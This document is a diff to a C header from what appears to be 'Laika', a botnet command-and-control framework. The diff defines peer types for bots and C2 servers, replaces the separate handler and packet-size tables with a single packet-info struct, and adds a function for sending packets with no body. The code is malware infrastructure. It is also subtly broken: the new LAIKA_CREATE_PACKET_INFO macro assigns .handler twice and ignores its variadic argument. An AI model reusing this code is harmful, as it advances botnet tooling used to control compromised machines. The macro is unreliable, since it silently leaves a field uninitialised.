@@ -11,11 +11,20 @@ typedef enum {
     PEER_UNVERIFIED,
     PEER_BOT,
     PEER_CNC, /* cnc 2 cnc communication */
-    PEER_PANEL /* authorized peers can send commands to cnc */
+    PEER_AUTH /* authorized peers can send commands to cnc */
 } PEERTYPE;
 
 struct sLaika_peer;
 typedef void (*PeerPktHandler)(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
+
+struct sLaika_peerPacketInfo {
+    PeerPktHandler handler;
+    LAIKAPKT_SIZE size;
+    bool variadic;
+};
+
+
+#define LAIKA_CREATE_PACKET_INFO(ID, HANDLER, SIZE, ISVARIADIC) [ID] = {.handler = HANDLER, .size = SIZE, .handler = HANDLER}
 
 struct sLaika_peer {
     struct sLaika_socket sock; /* DO NOT MOVE THIS. this member HAS TO BE FIRST so that typecasting sLaika_peer* to sLaika_sock* works as intended */
@@ -23,8 +32,7 @@ struct sLaika_peer {
     uint8_t inKey[crypto_kx_SESSIONKEYBYTES], outKey[crypto_kx_SESSIONKEYBYTES];
     char hostname[LAIKA_HOSTNAME_LEN], ipv4[LAIKA_IPV4_LEN];
     struct sLaika_pollList *pList; /* pollList we're activeList in */
-    PeerPktHandler *handlers;
-    LAIKAPKT_SIZE *pktSizeTable; /* const table to pull pkt size data from */
+    struct sLaika_peerPacketInfo *packetTbl; /* const table to pull pkt data from */
     void *uData; /* data to be passed to pktHandler */
     LAIKAPKT_SIZE pktSize; /* current pkt size */
     LAIKAPKT_ID pktID; /* current pkt ID */
@@ -35,10 +43,11 @@ struct sLaika_peer {
     bool useSecure; /* if true, peer will transmit/receive encrypted data using inKey & outKey */
 };
 
-struct sLaika_peer *laikaS_newPeer(PeerPktHandler *handlers, LAIKAPKT_SIZE *pktSizeTable, struct sLaika_pollList *pList, void *uData);
+struct sLaika_peer *laikaS_newPeer(struct sLaika_peerPacketInfo *packetTbl, struct sLaika_pollList *pList, void *uData);
 void laikaS_freePeer(struct sLaika_peer *peer);
 
 void laikaS_setSecure(struct sLaika_peer *peer, bool flag);
+void laikaS_emptyOutPacket(struct sLaika_peer *peer, LAIKAPKT_ID id); /* for sending packets with no body */
 void laikaS_startOutPacket(struct sLaika_peer *peer, LAIKAPKT_ID id);
 int laikaS_endOutPacket(struct sLaika_peer *peer);
 void laikaS_startVarPacket(struct sLaika_peer *peer, LAIKAPKT_ID id);
